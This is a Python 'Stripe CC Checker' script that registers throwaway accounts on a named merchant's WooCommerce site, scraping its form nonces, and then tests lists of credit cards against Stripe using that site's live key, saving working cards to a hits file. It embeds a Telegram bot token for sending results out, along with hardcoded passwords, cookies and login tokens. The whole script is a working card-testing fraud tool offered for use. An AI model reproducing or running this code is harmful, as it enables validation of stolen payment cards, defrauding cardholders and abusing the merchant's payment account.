from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import sys
import re
import random
import string
import os
import time
import requests

import time
import sys

# Loading Animation Function
def loading_animation():
    animation = ["[■□□□□□□□□□] 10%", "[■■□□□□□□□□] 20%", "[■■■□□□□□□□] 30%", 
                 "[■■■■□□□□□□] 40%", "[■■■■■□□□□□] 50%", "[■■■■■■□□□□] 60%", 
                 "[■■■■■■■□□□] 70%", "[■■■■■■■■□□] 80%", "[■■■■■■■■■□] 90%", 
                 "[■■■■■■■■■■] 100%"]
    for i in range(len(animation)):
        sys.stdout.write(f"\r\033[91m Loading... " + animation[i])
        sys.stdout.flush()
        time.sleep(0.4)
    
    # ACCESS GRANTED EFFECT
    sys.stdout.write("\n\033[92m ACCESS GRANTED! ✅\033[0m\n")
    time.sleep(1)

# Simple Warrior Checker Banner
bannerss = f"""
\033[91m   WARRIOR CHECKER - SYSTEM READY  
\033[91m   DEVELOPER: @RealTheWarrior  
\033[91m   | VERSION: 1.5 - PRO VERSION |
\033[0m
"""

# Run Banner & Loading Animation
print(bannerss)
loading_animation()
def display_banner():
    banner = bannerss
    print_red(banner)

def typing_animation(text):
    for char in text:
        print(f'\033[91m{char}\033[0m', end='', flush=True)
        time.sleep(0.03)  
    print()

required_modules = ["requests", "bs4", "re","json","random","string","datetime"]  

def print_line():
    print_red(f"""|\|==========================================|/|""")

def print_sline():
    print_cyan(f"""|----------------------------------------------|""")

def send_hits_to_telegram():
    telegram_token = "7867312434:AAEng1oDbRn23-emAdaiMMGeGreBIbTgT6s"
    telegram_chat_id = "5156462224"


    message = f""

    response = requests.post(
        f"https://api.telegram.org/bot{telegram_token}/sendMessage",
        data={'chat_id': telegram_chat_id, 'text': message}
    )
def check_modules(modules):
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"The required module '{module}' is not installed.(Run pip install {module})")
            print(f"Please install the missing module and try again.")
            sys.exit(1)  


def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html=(response.text)
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731840062.56.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; mailchimp.cart.previous_email=rokynoa00077@gmail.com; mailchimp.cart.current_email=rokynoa70@gmail.com; mailchimp_user_previous_email=rokynoa70%40gmail.com; mailchimp_user_email=rokynoa70%40gmail.com',
    'origin': 'https://www.thetravelinstitute.com',
    'referer': 'https://www.thetravelinstitute.com/register/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
        data = [
    ('afurd_field_nonce', f'{nonce}'),
    ('_wp_http_referer', '/register/'),
    ('pre_page', ''),
    ('email', f'{email}'),
    ('password', 'Esahatam2009@'),
    ('wc_order_attribution_source_type', 'typein'),
    ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
    ('wc_order_attribution_utm_campaign', '(none)'),
    ('wc_order_attribution_utm_source', '(direct)'),
    ('wc_order_attribution_utm_medium', '(none)'),
    ('wc_order_attribution_utm_content', '(none)'),
    ('wc_order_attribution_utm_id', '(none)'),
    ('wc_order_attribution_utm_term', '(none)'),
    ('wc_order_attribution_utm_source_platform', '(none)'),
    ('wc_order_attribution_utm_creative_format', '(none)'),
    ('wc_order_attribution_utm_marketing_tactic', '(none)'),
    ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
    ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
    ('wc_order_attribution_session_pages', '8'),
    ('wc_order_attribution_session_count', '1'),
    ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
    ('woocommerce-register-nonce', f'{noncee}'),
    ('_wp_http_referer', '/register/'),
    ('register', 'Register'),
]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data,timeout=20)
        if response.status_code == 200:
            with open('Creds.txt','a') as f:
                f.write(email+':'+'Esahatam2009@')
            return session
        else:
            
            return None
    except Exception as e:
        
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        
        cookies = session.cookies.get_dict()
        file.write(str(cookies))
    
def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            
            session = requests.Session()

            cookies = eval(session_data)  
            session.cookies.update(cookies)
            
            return session

    except Exception as e:
        
        h = 1
    return None

def manage_session_file():
    session_file = "session.txt"
    
    if os.path.exists(session_file):
        
        session = load_session_from_file(session_file)
        if session:
            return session
        else:
            print("")
    else:
        print("")
    
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    else:
        return None

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
   
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    
    return f"{username}@{domain}"

def print_red(text):
    print(f"\033[91m{text}\033[0m")

def print_green(text):
    print(f"\033[92m{text}\033[0m")

def print_yellow(text):
    print(f"\033[93m{text}\033[0m")

def print_blue(text): print(f"\033[94m{text}\033[0m")
def print_magenta(text): print(f"\033[95m{text}\033[0m")
def print_cyan(text): print(f"\033[96m{text}\033[0m")
def print_white(text): print(f"\033[97m{text}\033[0m")
def print_grey(text): print(f"\033[90m{text}\033[0m")
def print_light_blue(text): print(f"\033[104m{text}\033[0m")
def print_light_cyan(text): print(f"\033[106m{text}\033[0m")
def print_light_grey(text): print(f"\033[47m{text}\033[0m")
def print_light_magenta(text): print(f"\033[105m{text}\033[0m")
def print_dark_blue(text): print(f"\033[34m{text}\033[0m")
def print_dark_magenta(text): print(f"\033[35m{text}\033[0m")
def print_dark_cyan(text): print(f"\033[36m{text}\033[0m")
def print_dark_grey(text): print(f"\033[90m{text}\033[0m")
def print_dark_green(text): print(f"\033[32m{text}\033[0m")
def print_dark_yellow(text): print(f"\033[33m{text}\033[0m")
def print_dark_red(text): print(f"\033[31m{text}\033[0m")
def print_bright_blue(text): print(f"\033[94m{text}\033[0m")
def print_bright_magenta(text): print(f"\033[95m{text}\033[0m")
def print_bright_cyan(text): print(f"\033[96m{text}\033[0m")
def print_bright_grey(text): print(f"\033[97m{text}\033[0m")
def print_bright_green(text): print(f"\033[92m{text}\033[0m")
def print_bright_yellow(text): print(f"\033[93m{text}\033[0m")
def print_bright_red(text): print(f"\033[91m{text}\033[0m")


def get_credit_cards():
    print_red("[+] Do you want to check:")
    print_green("[/] 1. Single credit card")
    print_green("[/] 2. Multiple credit cards")
    choice = input(f"""\033[92m{'[+] Enter 1 OR 2: '}\033[0m""").strip()
    if choice == "1":
        cc = input(f"\033[92m{'[~] Enter the cc: '}\033[0m").strip()
        print_line()
        return [cc]
    elif choice == "2":
        file_path = input(f"\033[92m{'[~] Enter the (.txt) file path with ccs: '}\033[0m").strip()
        try:
            with open(file_path, "r") as file:
                cc_list = [line.strip() for line in file if line.strip()]
                print_green(f"Loaded {len(cc_list)} credit cards from the file.")
                print_line()
                return cc_list
        except FileNotFoundError:
            print_red("File not found. Please check the file path and try again.")
            return []
    else:
        print_red("Invalid choice. Please enter 1 or 2.")
        return []

def check_credit_cards(cc_list,sessions):
    start_time = time.time()
    total = len(cc_list)
    hit = 0
    dec = 0
    ccn = 0
    for cc in cc_list:
        try:
            print_sline()
            card = cc.replace('/','|')
            lista = card.split("|")
            cc = lista[0]
            mm = lista[1]
            yy = lista[2]
            if "20" in yy:
                yy = yy.split("20")[1]
            cvv = lista[3]
            session = sessions
            headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; mailchimp.cart.previous_email=jskdkkf@gmail.com; mailchimp.cart.current_email=rokynoa770@gmail.com; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732014706%7CnlixooWRVSegJrJXNcrUsmJaqDN6dbCvUOlUzcgbKUQ%7C121ace480380dc0d60c31096a81844176747e4861cb68812b5fb36a5475be6e4; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731841943.27.0.0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc',
    'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data,timeout=20)
            res = (response.text)
            iddd=''
            if 'error' in res:
                error=(response.json()['error']['message'])
                if 'code' in error:
                    print(f'> 𝗖𝗖𝗡 ✅ ---+-+-+-+-+!')
                    print_yellow(f'> {card} - {error}')
                    ccn += 1 
                    with open('CCN-HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    continue
                else:
                    print(f'> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ -------!')
                    print_red(f'> {card} - {error} ')
                    dec += 1
                    continue
            else:
                iddd = (response.json()['id'])
            headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa770@gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732015295%7Cm1Er1NFmC7q4NvE74vQ7Snt7F9RHgF4qOG0CT9cimNP%7Cd8bc8e35ada5fed2b938c6d5861f6bf604336db01506ddb5de23e0f5bf698a1f; sbjs_session=pgs%3D21%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731842574.60.0.0',
    'origin': 'https://www.thetravelinstitute.com',
    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

            params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

            data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': iddd,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': nonce,
}

            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data,timeout=20)
            res = (response.json())
            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                    print(f'> 𝗖𝗖𝗡 ✅ ---+-+-+-+-+!')
                    print_yellow(f'> {card} - {error}')
                    ccn += 1
                    with open('CCN-HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    continue
                else:
                    print(f'> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ -------!')
                    print_red(f'> {card} - {error}')
                    dec += 1
            else:
                print(f'> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ++++++++++++')
                with open('CCN-HITS.txt','a') as hits:
                    hits.write(card+'\n')
                print_green(f'> {card} - Successfull!')
                hit += 1
                
        except Exception as e:
            print_red('|+| Skipping Invalid Input.....')
            continue
    processing_time = time.time() - start_time
    minutes = int(processing_time // 60)
    seconds = processing_time % 60
    print_line()
    print_green(f'                   SUMMARY           ')
    print_line()
    print_green(f"""[+] Gateway: Single + Mass Stripe Auth + CCN
[~] Total: {total}
[>] Declined: {dec}
[>] Hit: {hit}
[>] CCN: {ccn}
[÷] Time: {minutes} min and {seconds:.2f} sec""")
    print_line()
    typing_animation('Thanks for using my checker!!')

def confirm_time():
    utc_now = datetime.utcnow()
    ksa_now = utc_now + timedelta(hours=3)
    ksa_date = ksa_now.date()
    if ksa_date > datetime(2025, 12, 25).date():
        typing_animation("The checker is dead now, follow  for more!!")
        exit()
def main():
    display_banner()
    print_line()
    confirm_time()
    check_modules(required_modules)
    typing_animation("This Stripe CC Checker Script Made By @RealTheWarrior,....")
    session = manage_session_file()
    if session:
    
        cc_list = get_credit_cards()
        if cc_list:
            print_green("          Checking credit card(s)...")
            check_credit_cards(cc_list,session)
        else:
            print_red("No valid credit card provided.")
    else:
        print(f"Unknown Error")

    
if __name__ == "__main__":
    main()
    

